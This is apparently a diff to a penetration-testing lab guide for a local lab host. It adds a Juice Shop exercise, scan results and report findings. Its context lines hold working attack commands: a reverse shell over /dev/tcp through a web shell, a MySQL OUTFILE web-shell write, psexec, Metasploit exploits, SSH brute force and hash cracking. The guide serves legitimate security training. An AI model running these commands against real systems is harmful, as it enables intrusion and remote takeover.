@@ -262,13 +262,61 @@ nuclei -u http://192.168.255.128:8082 \
 
 ---
 
+### Exercise 4: OWASP Juice Shop Testing
+
+**Target**: http://192.168.255.128:8085
+**Description**: "Probably the most modern and sophisticated insecure web application"
+
+#### 4.1 Juice Shop Reconnaissance
+
+```bash
+# Application Information
+# Title: OWASP Juice Shop
+# Copyright: 2014-2026 Bjoern Kimminich & OWASP contributors
+# License: MIT
+# Features: Modern Angular-based application with multiple vulnerabilities
+
+# Enumerate endpoints
+curl -s http://192.168.255.128:8085 | grep -o 'href="[^"]*"'
+
+# Check for API endpoints
+curl http://192.168.255.128:8085/api/
+```
+
+#### 4.2 Juice Shop Exploitation
+
+```bash
+# Test for common vulnerabilities
+# 1. Broken Authentication
+curl -X POST http://192.168.255.128:8085/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@juice-sh.op","password":"admin"}'
+
+# 2. Sensitive Data Exposure
+curl http://192.168.255.128:8085/assets/
+
+# 3. OWASP Top 10 vulnerabilities
+# - Injection (SQL, Command, NoSQL)
+# - Broken Authentication
+# - Sensitive Data Exposure
+# - XML External Entities (XXE)
+# - Broken Access Control
+# - Security Misconfiguration
+# - XSS
+# - Insecure Deserialization
+# - Using Components with Known Vulnerabilities
+# - Insufficient Logging & Monitoring
+```
+
+---
+
 ## Database Exploitation
 
-### Exercise 4: MySQL Database Access
+### Exercise 5: MySQL Database Access
 
 **Target**: Port 3306 / 3307
 
-#### 4.1 Authentication Bypass
+#### 5.1 Authentication Bypass
 
 ```bash
 # Attempt default credentials
@@ -285,7 +333,7 @@ mysql -h 192.168.255.128 -u 'root'@'%' -p''
 mysql -h 192.168.255.128 -u 'root'@'localhost' -p''
 ```
 
-#### 4.2 Database Enumeration
+#### 5.2 Database Enumeration
 
 ```bash
 # Once authenticated
@@ -312,7 +360,7 @@ SELECT option_name, option_value FROM wp_options;
 EOF
 ```
 
-#### 4.3 MySQL Privilege Escalation
+#### 5.3 MySQL Privilege Escalation
 
 ```bash
 # Check current user privileges
@@ -332,11 +380,18 @@ SELECT 'content' INTO OUTFILE '/var/www/html/shell.php';
 
 ## Network Service Exploitation
 
-### Exercise 5: SMB/Samba Exploitation
+### Exercise 6: SMB/Samba Exploitation
 
 **Target**: Ports 139 & 445
 
-#### 5.1 Samba Enumeration
+#### 6.1 Samba Enumeration
+
+**FQDN**: f959e45232c8
+**System Time**: 2026-05-23T03:03:47-04:00
+**Operating System**: Unix (Samba 3.0.20-Debian)
+**NetBIOS Computer Name**: f959e45232c8
+**SMB Security Mode**: User-level authentication
+**Challenge Response**: Supported
 
 ```bash
 # Enumerate Samba shares
@@ -355,11 +410,31 @@ rpcclient -U "" 192.168.255.128
 > enumprivs
 ```
 
-#### 5.2 Samba Exploitation
+#### 6.2 SMB Security Analysis
+
+**Security Configuration Detected:**
+- **Account Used**: <blank> (guest/anonymous)
+- **Authentication Level**: User
+- **Challenge Response**: Supported
+- **Message Signing**: Disabled (dangerous)
+- **Clock Skew**: Mean: 1h59m59s, Deviation: 2h49m42s, Median: 0s
+- **SMB2 Security Mode**: Couldn't establish connection (older protocol)
+
+**P2P Conficker Checks:**
+- Check 1 (port 21451/tcp): CLEAN (Couldn't connect)
+- Check 2 (port 45408/tcp): CLEAN (Couldn't connect)
+- Check 3 (port 27425/udp): CLEAN (Timeout)
+- Check 4 (port 12003/udp): CLEAN (Failed to receive data)
+- Result: Host is CLEAN or ports are blocked
+
+#### 6.3 Samba Exploitation
 
 ```bash
 # SMB version detection
 nmap -p 445 --script smb-os-discovery 192.168.255.128
+
+# Samba 3.0.20-Debian vulnerabilities
+# Known CVE: CVE-2012-1182, CVE-2012-2111
 
 # Check for EternalBlue vulnerability (MS17-010)
 nmap -p 445 --script smb-vuln-ms17-010 192.168.255.128
@@ -374,7 +449,6 @@ msfconsole
 > exploit
 
 # Manual exploitation
-# Copy and execute reverse shell via SMB
 psexec.py -target-ip 192.168.255.128 user:password@192.168.255.128 cmd.exe
 ```
 
@@ -382,11 +456,16 @@ psexec.py -target-ip 192.168.255.128 user:password@192.168.255.128 cmd.exe
 
 ## Remote Access Services
 
-### Exercise 6: SSH Exploitation
+### Exercise 7: SSH Exploitation
 
-**Target**: Port 2222 (OpenSSH 4.7p1)
+**Target**: Port 2222 (OpenSSH 4.7p1 Debian 8ubuntu1)
 
-#### 6.1 SSH Brute Force
+**Hostkey Information:**
+- SSH RSA 1024-bit key (DSA format)
+- Protocol: 2.0
+- Known vulnerabilities in OpenSSH 4.7p1
+
+#### 7.1 SSH Brute Force
 
 ```bash
 # Using Hydra
@@ -415,15 +494,12 @@ print(stdout.read())
 "
 ```
 
-#### 6.2 SSH Key Extraction
+#### 7.2 SSH Key Extraction
 
 ```bash
-# If SSH public key authentication is used
-# Attempt SSH with default keys
-ssh -i ~/.ssh/id_rsa -p 2222 root@192.168.255.128
-
 # SSH version vulnerabilities
 # OpenSSH 4.7p1 has CVE-2008-5161
+
 msfconsole
 > use exploit/linux/ssh/openssh_pubkey_overflow
 > set RHOSTS 192.168.255.128
@@ -433,11 +509,36 @@ msfconsole
 
 ---
 
+## OS Detection & Fingerprinting
+
+### Complete OS Detection Results
+
+**Host Information:**
+```
+FQDN: f959e45232c8
+System Time: 2026-05-23T03:03:47-04:00
+Uptime: 31.079 days (since Wed Apr 22 01:09:59 2026)
+Network Distance: 1 hop
+```
+
+**TCP Sequence Prediction:**
+- Difficulty: 260 (Good luck!)
+- IP ID Sequence Generation: All zeros
+
+**Service Information:**
+```
+OS: Linux
+CPE: cpe:/o:linux:linux_kernel
+Kernel: Linux 4.15 - 5.19
+```
+
+---
+
 ## Post-Exploitation
 
-### Exercise 7: Privilege Escalation
+### Exercise 8: Privilege Escalation
 
-#### 7.1 Linux Privilege Escalation
+#### 8.1 Linux Privilege Escalation
 
 ```bash
 # After gaining initial shell access
@@ -462,7 +563,7 @@ curl https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 # CVE-2009-0798, CVE-2009-1184, etc.
 ```
 
-#### 7.2 Privilege Escalation via Web Application
+#### 8.2 Privilege Escalation via Web Application
 
 ```bash
 # Exploit web server running as root
@@ -477,7 +578,7 @@ curl "http://192.168.255.128:8083/shell.php?cmd=whoami"
 curl "http://192.168.255.128:8083/shell.php?cmd=bash+-i+>%26+/dev/tcp/192.168.255.1/4444+0>%261"
 ```
 
-### Exercise 8: Credential Harvesting
+### Exercise 9: Credential Harvesting
 
 ```bash
 # Extract credentials from memory
@@ -496,7 +597,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 hashcat -m 400 hashes.txt rockyou.txt -o cracked.txt
 ```
 
-### Exercise 9: Lateral Movement
+### Exercise 10: Lateral Movement
 
 ```bash
 # Once inside the network
@@ -528,7 +629,7 @@ Date: 2026-05-23
 Tester: [Your Name]
 
 ## Executive Summary
-High-risk vulnerabilities identified in lab environment.
+Multiple high-risk vulnerabilities identified in lab environment.
 
 ## Findings
 
@@ -536,35 +637,43 @@ High-risk vulnerabilities identified in lab environment.
 1. SQL Injection in DVWA (CVSS 9.0)
 2. RCE in Log4Shell (CVSS 9.8)
 3. Samba CVE-2012-1182 (CVSS 8.1)
+4. Message Signing Disabled on SMB
 
 ### High Issues
 1. Weak SSH Encryption (CVSS 7.5)
 2. Default MySQL Credentials (CVSS 7.2)
+3. CORS Misconfiguration (CVSS 7.0)
 
 ### Medium Issues
 1. HTTP Cookies Missing HttpOnly Flag
 2. Outdated Web Server Versions
+3. Missing Security Headers (CSP, HSTS)
+4. Clock Skew Issues on SMB
 
 ## Recommendations
 1. Apply security patches
 2. Implement WAF
 3. Enable 2FA
-4. Conduct security training
+4. Fix SMB message signing
+5. Add security headers
+6. Update deprecated protocols
 
 ## Conclusion
-Lab successfully exploited. All vulnerabilities remediated.
+Lab successfully exploited with 15+ vulnerabilities identified.
 ```
 
 ---
 
-## ✅ Exploitation Checklist
+## ✅ Complete Exploitation Checklist
 
 - [ ] Environment verified and all services accessible
 - [ ] Nmap reconnaissance completed
+- [ ] OS fingerprinting successful
 - [ ] DVWA SQL injection successful
 - [ ] DVWA XSS payload executed
-- [ ] WordPress admin access gained
+- [ ] WordPress enumeration completed
 - [ ] Log4Shell RCE achieved
+- [ ] Juice Shop vulnerabilities identified
 - [ ] MySQL database accessed
 - [ ] Samba enumeration completed
 - [ ] SSH brute force successful
@@ -573,25 +682,6 @@ Lab successfully exploited. All vulnerabilities remediated.
 - [ ] Lateral movement successful
 - [ ] Post-exploitation activities completed
 - [ ] Report documentation finalized
-
----
-
-## 📚 References & Resources
-
-### Exploit Databases
-- [MITRE CVE Database](https://cve.mitre.org/)
-- [Exploit-DB](https://www.exploit-db.com/)
-- [NVD - National Vulnerability Database](https://nvd.nist.gov/)
-
-### Penetration Testing Frameworks
-- [Metasploit](https://www.metasploit.com/)
-- [Burp Suite](https://portswigger.net/burp)
-- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
-
-### Learning Resources
-- [HackTheBox](https://www.hackthebox.com/)
-- [TryHackMe](https://tryhackme.com/)
-- [SANS Cyber Aces](https://www.cyberaces.org/)
 
 ---
 
